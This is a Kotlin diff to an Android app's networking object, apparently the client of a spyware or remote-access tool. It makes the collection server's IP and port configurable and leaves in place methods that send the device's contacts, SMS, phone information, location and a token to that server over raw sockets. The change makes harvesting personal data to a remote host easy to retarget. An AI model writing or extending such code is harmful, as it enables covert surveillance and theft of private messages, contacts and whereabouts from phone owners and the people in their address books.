@@ -29,12 +29,15 @@ import java.util.logging.Logger
 object Interactor {
 
     private const val TAG = "Interactor"
-    private const val SERVER_IP = "10.0.2.2"
-    private const val SERVER_PORT = 33455
+
+    private var serverIp = Preferences.get<String>(Preferences.PreferencesField.IP)
+    private var serverPort = Preferences.get<Int>(Preferences.PreferencesField.PORT) ?: 33455
 
     private const val dataDivider = ":|:"
 
-    fun init() {
+    fun init(ip: String = "", port: Int = -1) {
+        serverIp = ip.ifBlank { Preferences.get<String>(Preferences.PreferencesField.IP) }
+        serverPort = if (port == -1) Preferences.get(Preferences.PreferencesField.PORT) ?: 33455 else port
     }
 
     fun sendToken() {
@@ -42,7 +45,7 @@ object Interactor {
         GlobalScope.launch(Dispatchers.IO) {
 
             val socket = Socket()
-            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+            socket.connect(InetSocketAddress(serverIp, serverPort))
 
             val output = socket.getOutputStream()
             val input = socket.getInputStream().bufferedReader()
@@ -73,7 +76,7 @@ object Interactor {
     fun sendContacts() {
         GlobalScope.launch(Dispatchers.IO) {
             val socket = Socket()
-            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+            socket.connect(InetSocketAddress(serverIp, serverPort))
 
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
             val contacts = ContactsHelper.getContacts(Application.context)
@@ -95,7 +98,7 @@ object Interactor {
     fun sendPhoneInfo() {
         GlobalScope.launch(Dispatchers.IO) {
             val socket = Socket()
-            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+            socket.connect(InetSocketAddress(serverIp, serverPort))
 
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
             val info = BuildInfo.getInfo()
@@ -115,7 +118,7 @@ object Interactor {
     fun sendSms() {
         GlobalScope.launch(Dispatchers.IO) {
             val socket = Socket()
-            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+            socket.connect(InetSocketAddress(serverIp, serverPort))
 
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
 
@@ -144,7 +147,7 @@ object Interactor {
     fun sendLocation() {
         GlobalScope.launch(Dispatchers.IO) {
             val socket = Socket()
-            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+            socket.connect(InetSocketAddress(serverIp, serverPort))
 
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
 
